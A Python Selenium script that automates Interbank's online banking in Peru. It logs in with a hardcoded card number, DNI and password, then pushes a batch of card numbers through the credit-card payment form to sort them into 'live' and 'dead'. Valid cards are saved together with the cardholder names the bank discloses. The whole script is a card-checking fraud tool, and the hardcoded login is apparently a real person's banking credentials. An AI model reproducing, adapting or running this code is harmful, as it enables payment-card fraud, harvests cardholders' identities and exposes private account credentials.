
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.firefox.options import FirefoxProfile

import time

class Xpath:
    numTarjeta = '//*[@id="25"]'
    documentoDNI = '//*[@id="39"]'
    claveWeb = '//*[@id="46"]'
    btnIngresar = '/html/body/div[1]/div[2]/div[1]/div[2]/div[2]/div/div/div/div[1]/div/button'
    
    rdbPagoTarjetaCredito = '/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[2]/div[2]/div/div/div[1]/div/div/div[2]/div/label[3]/span'
    btnIniciarPago = '/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[2]/div[2]/div/div/div[1]/div/div/div[3]/div/button'
    
    TipoDeTarjeta = '/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[2]/div[2]/div/div/div[2]/div/div/div/div/div[1]/div/input'
    otraTarjetaInterbank ='/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[2]/div[2]/div/div/div[2]/div/div/div/div/div[1]/div/div[1]/ul[1]/li[1]'
    
    inputTarjetaCre = '/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[2]/div[2]/div/div/div[2]/div/div/div/div/div[2]/div/div/div[1]/div/input'
    btnSiguiente = '/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[2]/div[2]/div/div/div[2]/div/div/div/div/div[2]/div/div/div[3]/div[2]/button'
    checkboxSoles = '/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[2]/div[2]/div/div/div[2]/div/div/div/div/div[2]/div/div/div[2]/div/div[2]/div[1]/div/label/span[3]'
    montoSoles= '/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[2]/div[2]/div/div/div[2]/div/div/div/div/div[2]/div/div/div[2]/div/div[2]/div[3]/div/input'

    modalError=  '/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[3]/div/div/div'
    aceptarModalError='/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[3]/div/div/div/div/div[4]/div/button'
    
    modalInfoLive ='/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[2]/div[2]/div/div/div[3]/div/div/div[1]'
    modalLive_Destionatario ='/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[2]/div[2]/div/div/div[3]/div/div/div[1]/div[1]/div[2]/div[2]/div[2]'
    modalLiveRetroceder ='/html/body/div[1]/div[2]/div/section/div/div/div[3]/div[2]/div[1]/div/div/div[2]/div[2]/div/div/div[3]/div/div/div[2]/div[1]/button'


class BotInterbank:
    def __init__(self, driver):
        self.driver = driver

    def click_key(self, key_id):
        try:
            key_element = self.driver.find_element(By.XPATH, f"//span[./*[@id='{key_id}']]")
            self.driver.execute_script("arguments[0].click();", key_element)
        except NoSuchElementException:
            print(f"No se encontró la tecla con id {key_id}.")
        except Exception as e:
            print(f"Error al hacer clic en la tecla: {e}")
        #time.sleep(0.5)

    def click_svg_element(self, svg_element):
        self.driver.execute_script("""
        var evt = new MouseEvent('click', {
            bubbles: true,
            cancelable: true,
            view: window
        });
        arguments[0].dispatchEvent(evt);
        """, svg_element)
        
    def click_caps_lock(self):
        try:
            # Aquí se asume que 'Shape' es el id correcto para la tecla de mayúsculas
            caps_lock_element = self.driver.find_element(By.XPATH, "//*[@id='Shape']")
            self.click_svg_element(caps_lock_element)
        except NoSuchElementException:
            print("No se encontró la tecla de mayúsculas.")
        except Exception as e:
            print(f"Error al hacer clic en la tecla de mayúsculas: {e}")

    def send_keys(self, input_string):
        for char in input_string:
            self.click_key(char)
            
    def open(self):
        self.driver.get("https://bancaporinternet.interbank.pe/login")
        #time.sleep(1)
        self.driver.find_element(By.XPATH, Xpath.numTarjeta).send_keys("4213550160330949")
        self.driver.find_element(By.XPATH, Xpath.documentoDNI).send_keys("42240356")
        self.driver.find_element(By.XPATH, Xpath.claveWeb).send_keys("1")
    
        self.click_key('T')
        self.click_caps_lock()
        self.send_keys('panduro84')
        
        self.driver.find_element(By.XPATH, Xpath.btnIngresar).click()
    def open_calarLives(self):
        wait0 = WebDriverWait(self.driver, 10)
        wait0.until(EC.visibility_of_element_located((By.XPATH, Xpath.rdbPagoTarjetaCredito)))
        self.driver.find_element(By.XPATH, Xpath.rdbPagoTarjetaCredito).click()
        self.driver.find_element(By.XPATH, Xpath.btnIniciarPago).click()
        self.driver.find_element(By.XPATH, Xpath.TipoDeTarjeta).click()
        self.driver.find_element(By.XPATH, Xpath.otraTarjetaInterbank).click()
        
    def calarLives(self,tarjeta):
        wait0 = WebDriverWait(self.driver, 10)
        #Para borrar
        wait0.until(EC.visibility_of_element_located((By.XPATH, Xpath.inputTarjetaCre)))
        input_field = self.driver.find_element(By.XPATH, Xpath.inputTarjetaCre)
        self.driver.execute_script("arguments[0].value = '';", input_field)

        self.driver.find_element(By.XPATH, Xpath.inputTarjetaCre).send_keys(str(tarjeta))
        self.driver.find_element(By.XPATH, Xpath.checkboxSoles).click()
        self.driver.find_element(By.XPATH, Xpath.montoSoles).send_keys("1")
        self.driver.find_element(By.XPATH, Xpath.btnSiguiente).click()
        
        while True:
            try:
                #print("Modal error")
                modal_error  = self.driver.find_element(By.XPATH, Xpath.modalError)
                if modal_error.is_displayed():
                    wait0.until(EC.visibility_of_element_located((By.XPATH, Xpath.aceptarModalError)))
                    self.driver.find_element(By.XPATH, Xpath.aceptarModalError).click()
                    #print("Modal error fin -")
                    return False,''
            except Exception :
                pass
                
            try:
                #print("Modal live")
                modal_live  = self.driver.find_element(By.XPATH, Xpath.modalInfoLive)
                if modal_live.is_displayed():
                    wait0.until(EC.visibility_of_element_located((By.XPATH, Xpath.modalLive_Destionatario)))
                    destinatario = self.driver.find_element(By.XPATH, Xpath.modalLive_Destionatario).text
                    self.driver.find_element(By.XPATH, Xpath.modalLiveRetroceder).click()
                    
                    #print("Modal live fin -")
                    return True,destinatario
            except Exception :
                pass
            time.sleep(0.1)
            #print('bucle')
        
if __name__ == '__main__':
    # Configurar opciones de Firefox
    firefox_options = Options()
    firefox_profile = FirefoxProfile()
    firefox_profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36")

    firefox_options.binary_location = r'C:\Program Files\Mozilla Firefox\firefox.exe'

    driver = webdriver.Firefox(options=firefox_options, firefox_profile=firefox_profile)
    

    bot = BotInterbank(driver)
    bot.open()

    bot = BotInterbank(driver)
    bot.open_calarLives()

    bot = BotInterbank(driver)
    def files():
        with open("lote.txt", "r", encoding="utf-8") as tarjetas, open("lives.txt", "a", encoding="utf-8") as archivo_lives:
            for tarjeta in tarjetas.readlines():
                verify, destinatario = bot.calarLives(tarjeta.strip())
                
                if verify:
                    print(f"Tarjeta: {tarjeta.strip()} - - - > L I V E  |  {destinatario}")
                    archivo_lives.write(f"{tarjeta.strip()},{destinatario}\n")
                else:  
                    print(f"Tarjeta: {tarjeta.strip()} - - - > D E A T H ")
                    
    files()
  
            


